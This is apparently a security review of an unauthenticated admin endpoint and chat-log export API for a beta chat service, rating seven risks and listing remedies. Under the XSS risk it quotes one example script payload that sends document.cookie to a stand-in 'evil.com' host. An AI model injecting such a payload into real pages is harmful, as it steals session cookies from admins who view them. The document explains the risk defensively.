# Admin Data Endpoint — Security Review

This document records the risks of exposing `/admin` and `/api/data/*` without
authentication, as agreed for the beta phase. Each risk is rated by
**likelihood** (how easily it is triggered) and **impact** (what goes wrong
when it is), combined into an overall **exposure** level.

## Summary

| # | Risk | Type | Likelihood | Impact | Exposure | Primary remedy |
|---|------|------|------------|--------|----------|----------------|
| 1 | Unauthenticated read of all chat logs | Access control | High | High | **Critical** | Obscure URL slug; add key before GA |
| 2 | PII in user queries stored in plaintext | Data handling | Medium | High | **High** | Beta notice + retention policy |
| 3 | XSS in admin UI from chat content | Web vuln | Low | Medium | **Medium** | Render as text, not HTML |
| 4 | DoS via large range exports | Resource exhaustion | Low | Medium | **Medium** | Streaming + row cap |
| 5 | Session ID exposure | Access control | Low | Low | **Low** | Accepted for beta |
| 6 | CORS wide open | Web hygiene | Low | Low | **Low** | Tighten when domain is known |
| 7 | SQLite WAL inconsistency on raw-file download | Data integrity | N/A | N/A | **N/A** | Not applicable — query-based export only |

## Details

### 1. Unauthenticated read of all chat logs — Critical
**How it happens:** `/admin` and the JSON/CSV endpoints have no auth. Anyone
who learns the URL (link sharing, referrer leak, crawler indexing it,
someone glancing at your screen) can read every conversation every beta
user has had.

**Why it matters:** Beta testers may ask region-specific questions that
reveal project plans, agency relationships, or procurement intent. Not
"bank login" sensitive, but not something you'd want published either.

**Remedies, cheapest first:**
- **Obscure URL slug:** serve the UI at `/admin-<random-32-chars>` rather
  than `/admin`. Stops casual discovery and crawlers; not a defense against
  anyone who has the link.
- **`robots.txt` disallow** for the admin path so search engines don't
  index it.
- **Shared secret in query string** (`?key=xyz`) — one step up from
  obscurity.
- **Shared secret in header** — slightly better (doesn't land in access
  logs).
- **HTTP basic auth** — browser-native prompt, one `Depends()` in FastAPI.
- **Railway private networking** — most robust if only your own tooling
  needs access.

### 2. PII in user queries stored in plaintext — High
**How it happens:** The `exchanges` table stores every user query verbatim.
Beta users may paste names, emails, phone numbers, internal memos, or
agency-specific details into chat.

**Why it matters:** You become custodian of that data. If the database
leaks (see #1) or Railway's disk is ever compromised, you have to explain
what was in it.

**Remedies:**
- **Beta notice:** one line in the chat UI telling users conversations are
  logged for quality review.
- **Retention policy:** decide how long you keep logs (30/60/90 days) and
  delete older rows on a schedule — `DELETE FROM exchanges WHERE timestamp
  < ?` is enough.
- **Redaction (optional):** regex-scrub obvious PII (emails, phone numbers)
  before insert. Probably overkill for beta.

### 3. XSS in admin UI from chat content — Medium
**How it happens:** `assistant_response` is already converted to HTML via
`markdown.markdown()` and stored in the DB. If the admin UI renders it with
`innerHTML`, a user query like
`<script>fetch('evil.com?'+document.cookie)</script>` executes in *your*
browser when you view the log.

**Why it matters:** You are the target, not the users. A malicious beta
tester could exfiltrate anything your session has access to.

**Remedy:** render queries and responses as **text** (`textContent`, not
`innerHTML`). Pretty markdown rendering can come later with a sanitizer
like DOMPurify.

### 4. DoS via large range exports — Medium
**How it happens:** A request for `?range=year&format=json` with 100k
exchanges loads everything into memory at once, serializes it, and sends
the response. Memory spike on Railway; possibly crashes the process.

**Remedies:**
- **Stream the response:** use `StreamingResponse` with a generator,
  writing row-by-row. Memory stays bounded regardless of row count.
- **Row cap:** hard-limit exports to, say, 50k rows per request. Beyond
  that, require a narrower date range.

### 5. Session ID exposure — Low
**How it happens:** Admin endpoints list `session_id` values. Someone with
the list could POST to `/api/chat` with that session_id and consume its
remaining query budget or read its conversation history in the response.

**Why it's low:** session_ids are UUIDv4 (128-bit random), so not guessable
anyway — the admin leak just adds them. The exploit costs a stranger their
daily query budget — not catastrophic.

**Remedy:** accepted for beta.

### 6. CORS wide open — Low
**How it happens:** `allow_origins=["*"]` lets any website's JavaScript
call the API. For unauthenticated endpoints this is essentially "GET by
any origin," which is already possible via `curl` — CORS just removes the
browser's seatbelt.

**Remedy:** once the production frontend is on a known domain, tighten
CORS to that origin. No urgency for beta.

### 7. SQLite WAL inconsistency on raw-file download — N/A
**Status:** Not applicable to this plan. An earlier draft proposed serving
the `.db` file directly, which can produce torn reads under WAL mode. The
current plan exports **query results** (CSV/JSON) instead, running inside
a consistent read transaction, so the issue doesn't apply. Noted here so
it doesn't resurface if someone later adds raw-file download.

## Recommended minimum before sharing the URL with beta testers

These are the cheap wins — each is a few lines of code:

1. **Obscure URL slug** (#1 partial remedy) — `/admin-<random>` generated
   once and stored in an env var.
2. **`robots.txt` disallowing** the admin path.
3. **Beta notice in the chat UI** that conversations are logged (#2).
4. **Render logs as text, not HTML** in the admin UI (#3).
5. **Stream exports + row cap** (#4).

Everything above is ~15 lines of code total. Full auth can come after beta
once you know who actually needs access.
